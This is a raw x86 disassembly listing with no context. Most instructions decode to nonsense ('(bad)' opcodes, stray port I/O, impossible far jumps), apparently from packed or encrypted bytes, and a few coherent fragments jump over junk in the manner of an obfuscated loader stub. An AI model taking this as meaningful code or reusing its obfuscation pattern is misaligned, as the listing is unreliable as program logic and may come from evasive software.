  406c44:	pushf  
  406c45:	add    DWORD PTR [esi-0x3356fd76],edi
  406c4b:	jmp    0x434dfb09
  406c50:	dec    edi
  406c51:	mov    eax,edx
  406c53:	push   es
  406c54:	add    DWORD PTR ds:0x8596c7f7,0xffffffca
  406c5b:	(bad)  
  406c5c:	xchg   ebx,eax
  406c5d:	jns    0x406cbf
  406c5f:	xor    eax,ecx
  406c61:	cld    
  406c62:	shr    DWORD PTR [ecx],cl
  406c64:	adc    al,ah
  406c66:	cld    
  406c67:	push   es
  406c68:	xor    BYTE PTR [esi+0xc6f64ca],al
  406c6e:	cmp    al,0x8
  406c70:	pop    ebx
  406c71:	or     al,0x2e
  406c73:	lea    edx,[eax]
  406c75:	(bad)  [edx-0x4de324be]
  406c7b:	xor    bh,BYTE PTR [ebx]
  406c7d:	sub    eax,0x393bfe
  406c82:	add    al,BYTE PTR [eax-0x53b43701]
  406c88:	dec    esi
  406c89:	mov    bh,0xd3
  406c8b:	test   bh,al
  406c8d:	or     ah,BYTE PTR [edi]
  406c8f:	cmp    eax,0x5fdd04c8
  406c94:	inc    edi
  406c95:	jnp    0x406ced
  406c97:	loop   0x406ccf
  406c99:	or     BYTE PTR [eax],bh
  406c9b:	pop    edx
  406c9c:	aam    0x8b
  406c9e:	leave  
  406c9f:	xor    esi,DWORD PTR [edi+0x46]
  406ca2:	imul   esp,DWORD PTR [ecx+0x78],0xffffff88
  406ca6:	ins    DWORD PTR es:[edi],dx
  406ca7:	adc    BYTE PTR [esi+edx*4],al
  406caa:	cmp    ch,0x4b
  406cad:	or     DWORD PTR [edi-0x7e502653],edx
  406cb3:	pop    ebp
  406cb4:	xor    dl,ah
  406cb6:	ja     0x406c9a
  406cb8:	test   bl,dl
  406cba:	(bad)  
  406cbb:	ret    0xf466
  406cbe:	sbb    ecx,DWORD PTR [ebx-0x6b]
  406cc1:	xchg   edx,ebp
  406cc3:	jle    0x406cc2
  406cc5:	jo     0x406d18
  406cc7:	push   esp
  406cc8:	test   eax,0x95ce4080
  406ccd:	mov    dl,dh
  406ccf:	gs xchg ebx,eax
  406cd1:	in     al,dx
  406cd2:	jmp    0x7901:0x18c2b7d
  406cd9:	dec    esp
  406cda:	lods   eax,DWORD PTR ds:[esi]
  406cdb:	adc    ah,BYTE PTR [edx+0x47]
  406cde:	out    0x8e,al
  406ce0:	aad    0x9e
  406ce2:	or     eax,0x102bec59
  406ce7:	xor    eax,DWORD PTR [ecx]
  406ce9:	adc    eax,edi
  406ceb:	mov    ds:0x9d8dca2f,eax
  406cf0:	cmp    BYTE PTR [esp+edi*8],dl
  406cf3:	dec    edi
  406cf4:	jmp    0x406d48
  406cf6:	aad    0x5
  406cf8:	fiadd  DWORD PTR [ebp-0x7630e548]
  406cfe:	push   esp
  406cff:	xor    edi,eax
  406d01:	mov    esp,0xd37b4f5a
  406d06:	stos   BYTE PTR es:[edi],al
  406d07:	fnstsw WORD PTR [edx-0x60]
  406d0a:	cmp    al,0x97
  406d0c:	outs   dx,DWORD PTR ds:[esi]
  406d0d:	fcom   st(7)
  406d0f:	jmp    0x2d4514ff
  406d14:	inc    bx
  406d16:	pop    ecx
  406d17:	push   ebp
  406d18:	dec    esi
  406d19:	popa   
  406d1a:	imul   DWORD PTR [edx-0x3fd13aa0]
  406d20:	popf   
  406d21:	cs iret 
  406d23:	neg    BYTE PTR [edx-0x235fef44]
  406d29:	into   
  406d2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d2b:	fcomp  st(0)
  406d2d:	cmp    ecx,DWORD PTR [esi]
  406d2f:	mov    ebp,0x6d44ca7
  406d34:	dec    ebx
  406d35:	xchg   ebx,eax
  406d36:	mov    ds:0x4a554637,eax
  406d3b:	pop    ss
  406d3c:	in     al,dx
  406d3d:	loopne 0x406d5b
  406d3f:	enter  0x167b,0xf4
  406d43:	cmp    al,0xc5
  406d45:	push   esi
  406d46:	mov    ebp,0x44843c46
  406d4b:	adc    esp,DWORD PTR [edi]
  406d4d:	inc    edx
  406d4e:	add    eax,0xc1336695
  406d53:	mov    ecx,0x3b02
  406d58:	sbb    DWORD PTR ds:0x4338af,0x433793
  406d62:	add    ax,cx
  406d65:	add    DWORD PTR ds:0x4338a3,0x7d57
  406d6f:	mov    ecx,DWORD PTR [ebp+0x8]
  406d72:	movzx  eax,ax
  406d75:	sbb    DWORD PTR ds:0x4337e3,0x43378f
  406d7f:	jmp    0x406f5e
  406d84:	cmp    DWORD PTR [ebx],ebp
  406d86:	es fdivrp st(4),st
  406d89:	repz shr DWORD PTR [ecx],0x6c
  406d8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d8e:	pop    esi
  406d8f:	xor    al,0x9e
  406d91:	mov    ds:0x38409744,al
  406d96:	jle    0x406e16
  406d98:	mov    esp,0x9f7e7e7f
  406d9d:	bnd ret 
  406d9f:	sbb    al,0x18
  406da1:	xchg   edx,eax
  406da2:	push   ebp
  406da3:	js     0x406e02
  406da5:	cmp    DWORD PTR [edx-0x80],0xd6f47557
  406dac:	bound  esi,QWORD PTR [edx+0x428a4f89]
  406db2:	push   ecx
  406db3:	mov    dl,0xd3
  406db5:	not    DWORD PTR [eax+0x7a]
  406db8:	das    
  406db9:	fld    QWORD PTR [edx-0x1f]
  406dbc:	xchg   edx,eax
  406dbd:	outs   dx,BYTE PTR ds:[esi]
  406dbe:	mov    dl,0xa5
  406dc0:	test   eax,0x2db4eff7
  406dc5:	fcmovnb st,st(5)
  406dc7:	sub    esi,DWORD PTR [ecx]
  406dc9:	ins    DWORD PTR es:[edi],dx
  406dca:	jg     0x406d79
  406dcc:	pop    ebx
  406dcd:	pop    es
  406dce:	ins    BYTE PTR es:[edi],dx
  406dcf:	fs adc edx,edi
  406dd2:	or     esp,DWORD PTR [esi+0x50]
  406dd5:	jg     0x406e36
  406dd7:	stc    
  406dd8:	(bad)  
  406dd9:	into   
  406dda:	(bad)  
  406ddb:	retf   0x5da0
  406dde:	xchg   ebp,eax
  406ddf:	mov    eax,ds:0x15261cef
  406de4:	aam    0x38
  406de6:	cmc    
  406de7:	adc    al,0x17
  406de9:	sub    esi,DWORD PTR [ebx-0x32f91d86]
  406def:	shr    DWORD PTR [eax+eax*4-0x4c4e4fe3],cl
  406df6:	cmp    BYTE PTR [edi],bl
  406df8:	sti    
  406df9:	adc    ebx,esi
  406dfb:	adc    eax,0x2bdbdbde
  406e00:	mul    cl
  406e02:	inc    ebp
  406e03:	mov    ds:0xc0797107,eax
  406e08:	jl     0x406dd6
  406e0a:	pop    ss
  406e0b:	shl    BYTE PTR ds:0x208004ab,0xbe
  406e12:	and    BYTE PTR [ebx],cl
  406e14:	jno    0x5b15ed82
  406e1a:	inc    ecx
  406e1b:	mov    dh,0xf1
  406e1d:	loopne 0x406dee
  406e1f:	imul   ebp,DWORD PTR [esi],0xf6fb2e3a
  406e25:	(bad)  
  406e26:	and    BYTE PTR [edi],cl
  406e28:	mov    DWORD PTR [ebp-0x7d5b676],ecx
  406e2e:	sub    ah,BYTE PTR [edx+0x4c588c85]
  406e34:	nop
  406e35:	out    0xcc,eax
  406e37:	fadd   QWORD PTR [ecx-0x5e89940d]
  406e3d:	jae    0x406dd2
  406e3f:	pop    edi
  406e40:	cmp    al,0xcd
  406e42:	dec    ebp
  406e43:	jno    0x406e7e
  406e45:	cmp    eax,0xfe78d7b7
  406e4a:	xchg   esp,eax
  406e4b:	mov    ds:0xc79e1b85,eax
  406e50:	add    ebx,DWORD PTR [ebp+0x6]
  406e53:	mov    esp,0x64576975
  406e58:	mov    edi,0xf37b667
  406e5d:	add    BYTE PTR [esi+0x31710299],cl
  406e63:	and    ah,BYTE PTR [ebx+0xe]
  406e66:	cmc    
  406e67:	aas    
  406e68:	push   ds
  406e69:	xchg   edx,eax
  406e6a:	push   ss
  406e6b:	daa    
  406e6c:	repnz into 
  406e6e:	dec    edi
  406e6f:	adc    BYTE PTR [ebx-0x2b60b778],0x23
  406e76:	sar    bl,0x50
  406e79:	repnz inc ebp
  406e7b:	call   0xde3e:0xb1b7509b
  406e82:	sub    cl,BYTE PTR [edi+0x67979c65]
  406e88:	and    BYTE PTR [ebx+esi*1],ch
  406e8b:	retf   0xb5ee
  406e8e:	pop    esp
  406e8f:	aam    0xc1
  406e91:	inc    ebx
  406e92:	xor    DWORD PTR [esi],eax
  406e94:	loopne 0x406e44
  406e96:	pop    esp
  406e97:	add    DWORD PTR [eax-0x4d],ebx
  406e9a:	sar    DWORD PTR [edi+0xd],1
  406e9d:	inc    ecx
  406e9e:	lahf   
  406e9f:	jmp    0x406ea8
  406ea1:	daa    
  406ea2:	xchg   BYTE PTR [ecx+0x72],ah
  406ea5:	inc    esp
  406ea6:	sbb    ecx,0x65
  406ea9:	popf   
  406eaa:	or     cl,BYTE PTR [ebp+0x37c62f01]
  406eb0:	popf   
  406eb1:	mov    bh,0x1f
  406eb3:	leave  
  406eb4:	in     eax,0xd4
  406eb6:	mov    ds:0xef3a545c,eax
  406ebb:	pop    ds
  406ebc:	out    dx,al
  406ebd:	stos   BYTE PTR es:[edi],al
  406ebe:	out    dx,al
  406ebf:	mov    al,ds:0x5bbc9cce
  406ec5:	cmp    BYTE PTR [eax-0x181e3a20],ch
  406ecb:	(bad)  
  406ecc:	mov    ds:0xde0dacc8,eax
  406ed1:	(bad)  
  406ed3:	test   BYTE PTR [ebp+0x32],dh
  406ed6:	icebp  
  406ed7:	inc    ecx
  406ed8:	and    eax,0x3f0acd0f
  406edd:	lock test DWORD PTR [esi],ebx
  406ee0:	pop    esi
  406ee1:	or     al,BYTE PTR [edi]
  406ee3:	leave  
  406ee4:	(bad)  
  406ee5:	scas   eax,DWORD PTR es:[edi]
  406ee6:	sbb    ch,BYTE PTR [ebx-0x77]
  406ee9:	pushf  
  406eea:	xchg   esp,eax
  406eeb:	mov    BYTE PTR [ebx+0x36],0x99
  406eef:	js     0x406ef8
  406ef1:	data16 sub dh,BYTE PTR [edx+0x39]
  406ef5:	jnp    0x406f52
  406ef7:	fs retf 
  406ef9:	add    edx,DWORD PTR [edi-0x80]
  406efc:	jne    0x406ea6
  406efe:	out    0xef,eax
  406f00:	stos   BYTE PTR es:[edi],al
  406f01:	imul   ebp,DWORD PTR [ebp+eiz*4-0x80],0x74
  406f06:	push   ebp
  406f07:	nop
  406f08:	sbb    eax,0x1c8ffa35
  406f0d:	push   eax
  406f0e:	adc    DWORD PTR [eax-0x3a],ecx
  406f11:	adc    al,0x6e
  406f13:	xlat   BYTE PTR ds:[ebx]
  406f14:	std    
  406f15:	jp     0x406f94
  406f17:	cld    
  406f18:	fimul  WORD PTR [edx-0x5846d21f]
  406f1e:	sub    al,0x22
  406f20:	shl    DWORD PTR [ebp+0x2fe009cf],1
  406f26:	jne    0x406f54
  406f28:	mov    dh,BYTE PTR [eax-0x20]
  406f2b:	sahf   
  406f2c:	mov    ecx,0xb6347730
  406f31:	or     BYTE PTR [esi+eiz*1+0x2f],0xb
  406f36:	cmp    esi,esp
  406f38:	sbb    ch,BYTE PTR [eax-0x7f]
  406f3b:	inc    esi
  406f3c:	mov    fs,WORD PTR [ebx+0x1c]
  406f3f:	push   edx
  406f40:	int3   
  406f41:	adc    al,0x15
  406f43:	fs (bad) 
  406f45:	stos   BYTE PTR es:[edi],al
  406f46:	pop    ss
  406f47:	pop    ds
  406f48:	mov    eax,0x6449a9
  406f4d:	retf   
  406f4e:	xchg   ebx,eax
  406f4f:	push   0xe
  406f51:	mov    ebx,0x1858adea
  406f56:	test   al,0x16
  406f58:	clc    
  406f59:	imul   ecx,DWORD PTR [eax],0xf70d98d8
  406f5f:	rol    BYTE PTR [ecx+0x43378f25],1
  406f65:	add    bl,dl
  406f67:	aaa    
  406f68:	inc    ebx
  406f69:	add    BYTE PTR [ebx],ah
  406f6b:	add    DWORD PTR [ebx+0x189084d],ecx
  406f71:	jmp    0x406f7d
  406f76:	xor    DWORD PTR [ebp-0x4],0xe149eb8
  406f7d:	mov    ax,WORD PTR [ebp-0x8]
  406f81:	jmp    0x407160
  406f86:	dec    ebx
  406f87:	rcr    BYTE PTR [ecx],0x72
  406f8a:	mov    cl,0x73
  406f8c:	push   ecx
  406f8d:	loope  0x406f7e
  406f8f:	sahf   
  406f90:	adc    al,BYTE PTR ds:0xd59910cb
  406f96:	mov    es,esi
  406f98:	jle    0x407018
  406f9a:	mov    esp,0x7d7e7e7f
  406f9f:	inc    esi
  406fa0:	add    ch,BYTE PTR [esi+0xc7b5186]
  406fa6:	dec    esi
  406fa7:	inc    ebx
  406fa8:	clc    
  406fa9:	mov    es,WORD PTR [ebx+0x1310b322]
  406faf:	mov    WORD PTR [ecx],gs
  406fb1:	pop    esp
  406fb2:	lds    eax,FWORD PTR fs:[eax+0x11]
  406fb6:	mov    eax,0x35cc0bea
  406fbb:	adc    al,0xd2
  406fbd:	cs inc esi
  406fbf:	sbb    DWORD PTR [eax+0x75f1e5fa],ebp
  406fc5:	and    ebp,eax
  406fc7:	cmp    al,BYTE PTR es:[edi+0x2c]
  406fcb:	int3   
  406fcc:	add    DWORD PTR [edx],esi
  406fce:	adc    eax,0x5fe4f056
  406fd3:	jns    0x406f6a
  406fd5:	imul   eax,DWORD PTR [eax],0x25476863
  406fdb:	ss mov ebx,0xf72f0795
  406fe1:	add    al,0xe1
  406fe3:	sbb    eax,0x551d28dd
  406fe8:	outs   dx,BYTE PTR ds:[esi]
  406fe9:	cwde   
  406fea:	jbe    0x406fa2
  406fec:	xchg   esi,eax
  406fed:	add    DWORD PTR [edx],esi
  406fef:	int3   
  406ff0:	and    eax,0xd756035a
  406ff5:	stos   BYTE PTR es:[edi],al
  406ff6:	(bad)  
  406ff7:	jle    0x40701e
  406ff9:	test   eax,0x49a284df
  406ffe:	xor    cl,0x6
  407001:	cwde   
  407002:	jns    0x406fa6
  407004:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407005:	xchg   ebx,eax
  407006:	ftst   
  407008:	sbb    DWORD PTR [ebx],esi
  40700a:	fistp  QWORD PTR [eax]
  40700c:	mov    bl,0xf6
  40700e:	xor    ch,BYTE PTR [edi+0x48]
  407011:	in     al,dx
  407012:	loop   0x407026
  407014:	(bad)  
  407015:	loopne 0x407046
  407017:	icebp  
  407018:	pop    ebp
  407019:	loope  0x407048
  40701b:	inc    esi
  40701c:	dec    esp
  40701d:	jb     0x406ff1
  40701f:	push   cs
  407020:	jno    0x407027
  407022:	(bad)  
  407024:	ins    BYTE PTR es:[edi],dx
  407025:	dec    edx
  407026:	mov    ch,bh
  407028:	cs adc ch,dl
  40702b:	in     eax,0xf3
  40702d:	pop    eax
  40702e:	push   ebp
  40702f:	xor    al,0x99
  407031:	rol    DWORD PTR [edi-0x6c],cl
  407034:	arpl   si,ax
  407036:	imul   esi,ebx,0x260ea04f
  40703c:	mov    esi,0x749b6776
  407041:	sbb    cl,cl
  407043:	fadd   DWORD PTR [ebx]
  407045:	adc    esi,DWORD PTR [ebx+0x1f]
  407048:	cmp    eax,0xfe383ded
  40704d:	pop    eax
  40704e:	inc    edx
  40704f:	inc    edi
  407050:	xor    al,0x4f
  407052:	popa   
  407053:	or     BYTE PTR [ecx+ebx*1],cl
  407056:	xchg   edx,eax
  407057:	stos   BYTE PTR es:[edi],al
  407058:	fnstcw WORD PTR [esp+ebx*1-0x66]
  40705c:	out    dx,eax
  40705d:	lock inc eax
  40705f:	fwait
  407060:	popa   
  407061:	pop    ebx
  407062:	jno    0x407013
  407064:	sub    eax,0x57408296
  407069:	lods   eax,DWORD PTR ds:[esi]
  40706a:	push   ds
  40706b:	push   0x287cbe9
  407070:	sbb    BYTE PTR [esp+ebx*2-0x2824d13c],0xe1
  407078:	sar    al,cl
  40707a:	je     0x407040
  40707c:	inc    edx
  40707d:	rol    bh,cl
  40707f:	iret   
  407080:	out    dx,eax
  407081:	fidiv  WORD PTR [ebx-0x3f1a3ad7]
  407087:	rcr    BYTE PTR [eax-0x5c],cl
  40708a:	sbb    esp,DWORD PTR [edx]
  40708c:	mov    bh,dh
  40708e:	mul    BYTE PTR [esi+0x3cdb4aab]
  407094:	add    BYTE PTR [ecx+0x14],ah
  407097:	mov    ds:0x5ae2b41a,eax
  40709c:	pusha  
  40709d:	mov    cl,0x57
  40709f:	icebp  
  4070a0:	lods   al,BYTE PTR ds:[esi]
  4070a1:	sbb    bl,BYTE PTR [edi+0x13]
  4070a4:	mov    esp,0x1924cec4
  4070a9:	cdq    
  4070aa:	div    DWORD PTR [edi+0x3c]
  4070ad:	test   BYTE PTR [ecx+0x3],ch
  4070b0:	mov    esi,0x47328e32
  4070b5:	aam    0x8c
  4070b7:	fucom  st(1)
  4070b9:	adc    ch,cl
  4070bb:	jle    0x407062
  4070bd:	jg     0x407069
  4070bf:	mov    al,ds:0xb4a44fa2
  4070c4:	or     ah,ah
  4070c6:	test   eax,0xa797f6d2
  4070cb:	jne    0x4070e1
  4070cd:	lds    esi,FWORD PTR [esi+0x3]
  4070d0:	jmp    0x5a43:0x6d1208d3
  4070d7:	(bad)  
  4070d8:	(bad)  
  4070d9:	adc    bl,bh
  4070db:	stos   BYTE PTR es:[edi],al
  4070dc:	cmp    DWORD PTR [ebx],0x55
  4070df:	sbb    ebp,ebx
  4070e1:	(bad)
  4070e4:	mov    eax,ds:0xdb604a5e
  4070e9:	add    edi,DWORD PTR [eax-0x3]
  4070ec:	adc    edx,DWORD PTR [eax-0x2d46d9c2]
  4070f2:	mov    edi,0x8793ef72
  4070f7:	or     eax,DWORD PTR [edx]
  4070f9:	lahf   
  4070fa:	nop
  4070fb:	sbb    al,0x53
  4070fd:	adc    al,0x89
  4070ff:	ret    
  407100:	dec    esp
  407101:	pushf  
  407102:	nop
  407103:	dec    esi
  407104:	sub    al,0xbf
  407106:	sub    ebx,ebx
  407108:	or     DWORD PTR [ebp+0x2f],ecx
  40710b:	lock sbb bh,BYTE PTR [ebp-0x1bfcd0f9]
  407112:	into   
  407113:	test   DWORD PTR [esi],ebp
  407115:	inc    ebp
  407116:	daa    
  407117:	(bad)  
  407118:	popa   
  407119:	out    dx,eax
  40711a:	pop    ebp
  40711b:	test   BYTE PTR ds:0xa2e5a455,bh
  407121:	ins    DWORD PTR es:[edi],dx
  407122:	xor    DWORD PTR [eax+esi*8],edi
  407125:	sti    
  407126:	std    
  407127:	imul   eax,ebp,0x68
  40712a:	(bad)  
  40712b:	std    
  40712c:	jae    0x407129
  40712e:	mov    gs,WORD PTR [edx+0x13]
  407131:	jmp    0x7aa7:0x18ff8b33
  407138:	shl    esp,1
  40713a:	jmp    0x42ec02f2
  40713f:	les    ebx,FWORD PTR [edi+edi*2-0x5e]
  407143:	adc    ch,BYTE PTR [edi-0x3c2d83dc]
  407149:	ficomp DWORD PTR ds:0xfa16328a
  40714f:	mov    ebx,esp
  407151:	add    DWORD PTR [ecx],edi
  407153:	xchg   ebp,eax
  407154:	fiadd  WORD PTR [ebx]
  407156:	push   ecx
  407157:	mov    ds:0x8ec89df4,eax
  40715c:	add    eax,0xff36b7b7
  407161:	jne    0x40716b
  407163:	call   0x407353
  407168:	test   eax,eax
  40716a:	jmp    0x407349
  40716f:	and    eax,0xb1edb090
  407174:	in     eax,dx
  407175:	popa   
  407176:	push   eax
  407177:	retf   
  407178:	xchg   BYTE PTR [ebx-0x74],dh
  40717b:	dec    esp
  40717c:	test   DWORD PTR [ecx],ebp
  40717e:	out    0xcc,al
  407180:	les    edi,FWORD PTR [esi+0x7e]
  407183:	mov    esp,0xc7e7e7f
  407188:	enter  0x1c68,0x7b
  40718c:	loope  0x407117
  40718e:	loope  0x4071b3
  407190:	mov    al,ds:0x261cdb98
  407195:	sub    DWORD PTR ds:0x41e5c7f8,ecx
  40719b:	dec    ecx
  40719c:	aas    
  40719d:	xchg   edi,eax
  40719e:	mov    edi,0xfe9e8879
  4071a3:	(bad)  
  4071a4:	and    dl,BYTE PTR [edi+0x30867cc2]
  4071aa:	jle    0x4071c9
  4071ac:	ror    BYTE PTR [esi-0x5a7925b3],1
  4071b2:	loopne 0x407185
  4071b4:	sbb    esp,DWORD PTR [edx+0x3c42cec8]
  4071ba:	mov    ecx,DWORD PTR [ebp+0x69]
  4071bd:	mov    ebp,0xec5fc5b
  4071c2:	ds add eax,0x2fe7d5af
  4071c8:	bound  ecx,QWORD PTR [esi+0x24260b67]
  4071ce:	ins    DWORD PTR es:[edi],dx
  4071cf:	jo     0x407193
  4071d1:	fistp  DWORD PTR [bp+di]
  4071d4:	sub    DWORD PTR [eax],0xffffffef
  4071d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4071d8:	ss dec ebp
  4071da:	fimul  DWORD PTR [ecx+0x6c]
  4071dd:	in     eax,dx
  4071de:	mov    al,ds:0xdc404a49
  4071e3:	sbb    eax,0xbd26fbc8
  4071e8:	ins    DWORD PTR es:[edi],dx
  4071e9:	cmp    BYTE PTR [ebx],0xf1
  4071ec:	scas   al,BYTE PTR es:[edi]
  4071ed:	cmp    BYTE PTR [eax+0xc11ccba],bl
  4071f3:	call   0xb0d8:0xd32cfad6
  4071fa:	adc    DWORD PTR [ebx],edx
  4071fc:	xor    BYTE PTR [ebx],al
  4071fe:	mov    ebx,0x33f6cbcd
  407203:	scas   eax,DWORD PTR es:[edi]
  407204:	and    cl,BYTE PTR [esi]
  407206:	or     eax,0x86ce8e41
  40720b:	push   ss
  40720c:	das    
  40720d:	mov    ds:0xdeeb677,eax
  407212:	xchg   ebp,eax
  407213:	push   edi
  407214:	sub    ebx,DWORD PTR [eax+0x4934cfcf]
  40721a:	call   0xa56:0x9d78a31
  407221:	inc    ebx
  407222:	jb     0x407266
  407224:	push   ebx
  407225:	and    al,0x81
  407227:	mov    ss,esp
  407229:	mov    ah,0x7
  40722b:	sub    DWORD PTR [ebp+0x11],eax
  40722e:	outs   dx,BYTE PTR ds:[esi]
  40722f:	or     ecx,DWORD PTR [esi+0x5bc59cee]
  407235:	cld    
  407236:	push   ebx
  407237:	fild   DWORD PTR [ecx+edx*4-0x7d5a6ae6]
  40723e:	in     al,0xad
  407240:	mov    bh,0x9a
  407242:	inc    BYTE PTR [edi-0x2f]
  407245:	or     cl,BYTE PTR [ecx+0x6]
  407248:	fmul   QWORD PTR [esi+edi*1-0x60]
  40724c:	mov    eax,ds:0xee62ee78
  407251:	pop    ss
  407252:	ficom  WORD PTR [esi+0x47ca3c08]
  407258:	adc    eax,0xdfd6bc22
  40725d:	retf   0x4444
  407260:	mov    dh,0xee
  407262:	sub    DWORD PTR [ecx+0x78240604],ebx
  407268:	cli    
  407269:	rol    DWORD PTR [ebp-0x3fff3e08],cl
  40726f:	sub    DWORD PTR [esi-0x5d],0xffffffae
  407273:	repz xchg ecx,eax
  407275:	inc    ebx
  407276:	rcl    eax,1
  407278:	arpl   sp,bp
  40727a:	jno    0x4072a5
  40727c:	ret    0x5f08
  40727f:	mov    dh,BYTE PTR [eax-0x5d]
  407282:	addr16 push ebp
  407284:	cmp    al,0xe8
  407286:	rol    DWORD PTR [esi+0x66],1
  407289:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40728a:	jp     0x407210
  40728c:	dec    ecx
  40728d:	mov    ch,0xf5
  40728f:	push   0x5e
  407291:	jnp    0x407231
  407293:	cmp    BYTE PTR [esi+0x17e2cf7d],bl
  407299:	rcl    esi,1
  40729b:	sar    BYTE PTR [ebp+0x11],0xab
  40729f:	imul   edi,ebp,0xffffffc1
  4072a2:	fstp   QWORD PTR [edi]
  4072a4:	cmp    al,0x1c
  4072a6:	adc    al,0xd
  4072a8:	outs   dx,DWORD PTR ds:[esi]
  4072a9:	mov    ch,0xd1
  4072ab:	popf   
  4072ac:	aad    0xa9
  4072ae:	into   
  4072af:	add    BYTE PTR [edx],dl
  4072b1:	ret    0x38b7
  4072b4:	jmp    0x40727f
  4072b6:	add    edi,0x1c
  4072b9:	push   edx
  4072ba:	jbe    0x407278
  4072bc:	inc    ebx
  4072bd:	sbb    al,0x58
  4072bf:	in     al,dx
  4072c0:	cmp    esp,esp
  4072c2:	das    
  4072c3:	and    eax,esi
  4072c5:	adc    ah,dl
  4072c7:	out    dx,al
  4072c8:	loope  0x40728f
  4072ca:	and    DWORD PTR [edi],esi
  4072cc:	adc    edx,DWORD PTR [ecx]
  4072ce:	pop    ss
  4072cf:	leave  
  4072d0:	shl    ecx,0xa2
  4072d3:	test   al,0x98
  4072d5:	push   esi
  4072d6:	mov    dl,0xa
  4072d8:	pushf  
  4072d9:	xor    al,0xcd
  4072db:	and    BYTE PTR [edi-0x5c],bh
  4072de:	adc    DWORD PTR [edx+eax*1-0x58],0xffffffec
  4072e3:	stos   DWORD PTR es:[edi],eax
  4072e4:	pusha  
  4072e5:	imul   ebp,ebx,0xcb3a4065
  4072eb:	push   es
  4072ec:	push   ss
  4072ed:	enter  0x113,0x9d
  4072f1:	stos   BYTE PTR es:[edi],al
  4072f2:	imul   esi,DWORD PTR [eax+edx*4+0x6ae5598e],0x62
  4072fa:	cld    
  4072fb:	or     eax,0x1f4ea418
  407300:	(bad)  
  407301:	sub    eax,0x28f82411
  407306:	mov    cl,0x70
  407308:	imul   edi,ecx,0xffffffd9
  40730b:	dec    ecx
  40730c:	mov    dl,0x4b
  40730e:	push   cs
  40730f:	push   ebp
  407310:	out    0x88,al
  407312:	loop   0x40730e
  407314:	scas   eax,DWORD PTR es:[edi]
  407315:	adc    dl,bh
  407317:	xor    al,BYTE PTR [ecx+0x2c]
  40731a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40731b:	push   edx
  40731c:	pop    esp
  40731d:	jmp    0x4072a2
  40731f:	push   ebx
  407320:	push   0x71f63910
  407325:	cmp    eax,0x575631b7
  40732a:	fmul   st,st(2)
  40732c:	data16 xor al,BYTE PTR [ecx-0x1a]
  407330:	cmp    eax,0xed01adf3
  407335:	dec    edx
  407336:	or     DWORD PTR [ecx],edx
  407338:	xor    al,0x8
  40733a:	dec    edx
  40733b:	shl    BYTE PTR [ebx+0xaa80191],0xfc
  407342:	pop    es
  407343:	jns    0x40738c
  407345:	sahf   
  407346:	pop    edx
  407347:	mov    eax,0x27840fd2
  40734c:	cld    
  40734d:	(bad)  
  40734e:	dec    ecx
  407350:	ret    0x4
  407353:	push   ebp
  407354:	mov    ebp,esp
  407356:	sub    esp,0x2c
  407359:	and    DWORD PTR ds:0x4337d7,0x5787
  407363:	mov    DWORD PTR [ebp-0x8],0xf89c8532
  40736a:	mov    eax,ds:0x4338ab
  40736f:	or     DWORD PTR ds:0x4338af,eax
  407375:	jmp    0x40759d
  40737a:	pop    edx
  40737b:	cmp    al,0x59
  40737d:	inc    ebx
  40737e:	pop    ecx
  40737f:	arpl   WORD PTR [eax-0x1b],sp
  407382:	js     0x407389
  407384:	push   esi
  407385:	loope  0x407307
  407387:	in     eax,0xb8
  407389:	repnz or al,dl
  40738c:	jle    0x40740c
  40738e:	add    eax,0x6e7e7e7c
  407393:	cdq    
  407394:	aad    0x19
  407396:	lods   al,BYTE PTR ds:[esi]
  407397:	sub    DWORD PTR [eax+ecx*8],edi
  40739a:	push   ss
  40739b:	imul   BYTE PTR [ecx-0x1b]
  40739e:	push   edx
  40739f:	xchg   ebp,eax
  4073a0:	or     eax,DWORD PTR [edi-0x303aa8d]
  4073a6:	das    
  4073a7:	imul   ebp,DWORD PTR [edi+ecx*2-0x3f],0x78a83274
  4073af:	cmc    
  4073b0:	in     al,dx
  4073b1:	mov    dh,0xdf
  4073b3:	jo     0x40742c
  4073b5:	adc    al,0xce
  4073b7:	push   esi
  4073b8:	xchg   esp,eax
  4073b9:	ret    0x231d
  4073bc:	in     eax,0x54
  4073be:	sbb    ebp,DWORD PTR [ebx-0x2d]
  4073c1:	sub    al,0xd8
  4073c3:	xchg   ebp,eax
  4073c4:	loope  0x4073f2
  4073c6:	cmp    edi,DWORD PTR [eax+0x73c14377]
  4073cc:	sti    
  4073cd:	into   
  4073ce:	inc    ebx
  4073cf:	adc    eax,0xfd311b30
  4073d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4073d5:	mov    ebx,ebp
  4073d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4073d8:	addr16 jns 0x4073d4
  4073db:	fisttp WORD PTR [edi]
  4073dd:	pop    ecx
  4073de:	or     ebp,DWORD PTR [esi+ebp*1]
  4073e1:	and    DWORD PTR [edi],edx
  4073e3:	aad    0xae
  4073e5:	inc    esi
  4073e6:	mov    edi,0x8112c0bc
  4073eb:	lahf   
  4073ec:	sub    bh,cl
  4073ee:	fcom   DWORD PTR [esi-0x1169b236]
  4073f4:	jl     0x407399
  4073f6:	rcr    BYTE PTR [ecx-0x11],0x28
  4073fa:	jbe    0x4073ff
  4073fc:	inc    esp
  4073fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4073fe:	mov    ebx,0xfb4bd520
  407403:	fcmovnbe st,st(3)
  407405:	dec    esp
  407406:	addr16 inc esi
  407408:	mov    ds:0x2623ebba,al
  40740d:	dec    ecx
  40740e:	div    DWORD PTR [edi+edx*1+0x7f]
  407412:	ror    DWORD PTR [ebp*4-0x5c0a304b],cl
  407419:	aaa    
  40741a:	xor    edx,ebx
  40741c:	mov    WORD PTR [edi-0x406bbb54],ss
  407422:	sbb    esi,0xb3d7db6f
  407428:	enter  0x4179,0xa5
  40742c:	xchg   DWORD PTR [ecx-0x757c1abb],esp
  407432:	dec    edi
  407433:	adc    edx,edi
  407435:	hlt    
  407436:	ret    0x6b4d
  407439:	or     ch,BYTE PTR [esi-0x69]
  40743c:	es test ebx,ecx
  40743f:	or     edi,ebp
  407441:	and    BYTE PTR [ebp+0x46],bh
